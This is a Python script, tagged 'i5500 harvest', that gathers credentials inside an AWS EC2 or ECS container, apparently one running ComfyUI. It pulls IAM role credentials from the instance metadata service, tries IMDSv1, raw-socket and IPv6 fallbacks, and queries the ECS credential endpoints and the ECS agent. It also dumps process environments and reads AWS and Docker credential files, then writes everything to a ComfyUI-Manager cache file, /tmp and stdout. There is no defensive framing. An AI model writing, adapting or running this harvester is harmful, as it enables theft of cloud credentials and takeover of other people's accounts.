#!/usr/bin/env python3
# i5500 harvest: EC2 instance-profile identity (IMDSv2/v1) + 2nd credential endpoint + /proc env + ECS agent
import os, sys, json, time, subprocess, urllib.request, urllib.error, socket, glob, struct

TAG = "i5500"
V = 1
H = {"_meta": {"tag": TAG, "v": V, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               "uid": os.getuid(), "cwd": os.getcwd(), "argv": sys.argv, "py": sys.version.split()[0]}}

def sh(cmd, t=8, cap=6000):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (p.stderr or ""))[:cap]
    except Exception as e:
        return "ERR %r" % e

def http(url, method="GET", headers=None, t=4, limit=200000):
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq = urllib.request.Request(url, headers=headers or {}, method=method)
        with op.open(rq, timeout=t) as r:
            return {"code": r.status, "body": r.read(limit).decode("utf8", "replace")}
    except urllib.error.HTTPError as e:
        try: body = e.read(4000).decode("utf8", "replace")
        except Exception: body = ""
        return {"code": e.code, "body": body}
    except Exception as e:
        return {"code": -1, "body": type(e).__name__ + ": " + str(e)[:300]}

def sock_http(host, port, path, method="GET", extra_hdrs=None, t=3):
    try:
        s = socket.create_connection((host, port), timeout=t)
        hdrs = {"Host": host, "Connection": "close"}
        hdrs.update(extra_hdrs or {})
        req = "%s %s HTTP/1.1\r\n" % (method, path) + "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) + "\r\n"
        s.sendall(req.encode())
        d = b""
        while True:
            c = s.recv(4096)
            if not c: break
            d += c
            if len(d) > 60000: break
        s.close()
        return {"ok": True, "resp": d.decode("utf8", "replace")[:3000]}
    except Exception as e:
        return {"ok": False, "err": type(e).__name__ + ": " + str(e)[:200]}

env = dict(os.environ)
H["env"] = {k: v for k, v in env.items() if k.startswith(("AWS_", "ECS_", "COMFY", "HOSTNAME", "HOME", "PATH"))}

# ---------- IMDSv2 (token) then IMDSv1 fallback ----------
H["imds"] = {}
tok = http("http://169.254.169.254/latest/api/token", method="PUT",
           headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
H["imds"]["token"] = {"code": tok["code"], "body": tok["body"][:400]}
tokv = tok["body"].strip() if tok["code"] == 200 else ""
tls = "IMDSv2" if tokv else "IMDSv1"
H["imds"]["mode"] = tls
def imds(path, use_tok=True, t=4):
    hs = {"X-aws-ec2-metadata-token": tokv} if (use_tok and tokv) else {}
    return http("http://169.254.169.254" + path, headers=hs, t=t)
paths = ["/latest/meta-data/instance-id", "/latest/meta-data/instance-type", "/latest/meta-data/ami-id",
         "/latest/meta-data/placement/region", "/latest/meta-data/placement/availability-zone",
         "/latest/meta-data/local-hostname", "/latest/meta-data/local-ipv4", "/latest/meta-data/public-ipv4",
         "/latest/meta-data/mac", "/latest/meta-data/iam/info", "/latest/meta-data/iam/security-credentials/",
         "/latest/meta-data/identity-credentials/ec2/info",
         "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
         "/latest/meta-data/network/interfaces/macs/", "/latest/meta-data/services/domain",
         "/latest/dynamic/instance-identity/document", "/latest/user-data"]
for p in paths:
    r = imds(p)
    key = p.rsplit("/", 1)[-1] or "root"
    H["imds"][key] = {"code": r["code"], "body": r["body"][:4000]}
# role creds: list then each role
rl = H["imds"].get("security-credentials", {})
roles = []
if rl.get("code") == 200:
    roles = [x.strip() for x in rl.get("body", "").splitlines() if x.strip()]
H["imds"]["roles"] = roles
H["imds"]["cred"] = {}
for role in roles[:4]:
    r = imds("/latest/meta-data/iam/security-credentials/" + role)
    H["imds"]["cred"][role] = {"code": r["code"], "body": r["body"][:4000]}
# IMDSv1 fallback when v2 failed, for the critical ones
if not tokv:
    for p in ["/latest/meta-data/instance-id", "/latest/meta-data/iam/info",
              "/latest/meta-data/iam/security-credentials/",
              "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]:
        r = imds(p, use_tok=False)
        H["imds"]["v1_" + (p.rsplit("/", 1)[-1] or "root")] = {"code": r["code"], "body": r["body"][:2000]}
# raw-socket attempts (bypass urllib oddities) + IPv6 IMDS
H["imds"]["sock_put"] = sock_http("169.254.169.254", 80, "/latest/api/token", "PUT",
                                  {"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
H["imds"]["sock_v1_iam"] = sock_http("169.254.169.254", 80, "/latest/meta-data/iam/security-credentials/")
H["imds"]["http10"] = http("http://169.254.169.254/latest/meta-data/instance-id", headers={"Connection": "close"})
H["imds"]["ipv6"] = http("http://[fd00:ec2::254]/latest/meta-data/instance-id", t=3)

# ---------- ECS container credential endpoint (2nd identity surface) ----------
H["ecs2"] = {}
rel = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
full = env.get("AWS_CONTAINER_CREDENTIALS_FULL_URI", "")
H["ecs2"]["rel_uri"] = rel
H["ecs2"]["full_uri"] = full
H["ecs2"]["rel_cred"] = http("http://169.254.170.2" + rel) if rel else None
H["ecs2"]["full_cred"] = http(full, headers={"Authorization": env.get("AWS_CONTAINER_AUTHORIZATION_TOKEN", "")}) if full else None
H["ecs2"]["v2_creds_noauth"] = http("http://169.254.170.2/v2/credentials")
H["ecs2"]["v2_metadata"] = http("http://169.254.170.2/v2/metadata")
v4 = env.get("ECS_CONTAINER_METADATA_URI_V4") or env.get("ECS_CONTAINER_METADATA_URI", "")
H["ecs2"]["v4_uri"] = v4
if v4:
    H["ecs2"]["task"] = http(v4 + "/task")
    H["ecs2"]["container"] = http(v4)
agent = env.get("ECS_AGENT_URI", "")
H["ecs2"]["agent_uri"] = agent
if agent:
    H["ecs2"]["agent_meta"] = http(agent + "/metadata" if not agent.rstrip("/").endswith("metadata") else agent)

# ---------- ECS agent introspection (loopback + host gateway) ----------
H["agent"] = {}
H["agent"]["loopback"] = http("http://127.0.0.1:51678/v1/metadata", t=3)
H["agent"]["loopback_tasks"] = http("http://127.0.0.1:51678/v1/tasks", t=3)
route = sh("cat /proc/net/route")
H["agent"]["route"] = route[:800]
gw = None
for line in route.splitlines()[1:]:
    f = line.split()
    if len(f) >= 3 and f[1] == "00000000":
        try:
            gw = socket.inet_ntoa(struct.pack("<L", int(f[2], 16)))
        except Exception:
            pass
        break
H["agent"]["gateway"] = gw
if gw:
    H["agent"]["gw_meta"] = http("http://%s:51678/v1/metadata" % gw, t=3)
    H["agent"]["gw_tasks"] = http("http://%s:51678/v1/tasks" % gw, t=3)
H["agent"]["hostip"] = sh("cat /etc/hosts; hostname -i 2>&1")

# ---------- /proc environments (PID1 and siblings) ----------
H["proc"] = {}
for pid in ["1", "self"] + [p.split("/")[-1] for p in sorted(glob.glob("/proc/[0-9]*"))[:12] if p.split("/")[-1] != "1"]:
    try:
        e = open("/proc/%s/environ" % pid, "rb").read(20000).decode("utf8", "replace")
        H["proc"][pid] = {"cmdline": open("/proc/%s/cmdline" % pid, "rb").read(600).decode("utf8", "replace"),
                          "environ": {k: v for k, v in (kv.split("=", 1) for kv in e.split("\x00") if "=" in kv)}}
    except Exception as ex:
        H["proc"][pid] = {"err": type(ex).__name__}
H["proc_net"] = {"route": route, "hosts": sh("cat /etc/hosts"), "resolv": sh("cat /etc/resolv.conf"), "netdev": sh("cat /proc/net/dev")}

# ---------- identity/system + aws files ----------
H["sys"] = {
    "id": sh("id"), "hostname": sh("hostname"), "uname": sh("uname -a"), "nproc": sh("nproc"),
    "cgroup": sh("cat /proc/1/cgroup 2>/dev/null; cat /proc/self/cgroup"),
    "dockerenv": sh("ls -la /.dockerenv /run/.containerenv 2>&1"),
    "gpu": sh("nvidia-smi -L 2>&1 | head -5; ls /dev/nvidia* 2>&1 | head"),
    "ps": sh("ps -ef 2>/dev/null | head -15"),
}
H["aws_files"] = {
    "credentials": sh("cat /root/.aws/credentials 2>&1; cat /home/*/.aws/credentials 2>&1"),
    "config": sh("cat /root/.aws/config 2>&1; cat /home/*/.aws/config 2>&1"),
    "docker_cfg": sh("cat /root/.docker/config.json 2>&1"),
    "etc_env": sh("cat /etc/environment 2>&1"),
    "aws_mount": sh("ls -la /root/.aws 2>&1; grep -i aws /proc/self/mountinfo | head -5"),
}

out = json.dumps(H)
paths_w = ["/ComfyUI/user/default/ComfyUI-Manager/cache/%s_harvest.json" % TAG,
           os.path.join(os.getcwd(), "%s_harvest.json" % TAG),
           "/tmp/%s_harvest.json" % TAG]
for p in paths_w:
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w").write(out)
    except Exception as e:
        print("[%s] write-fail %s %r" % (TAG, p, e), flush=True)
print("[%s] HARVEST " % TAG + out[:120000], flush=True)
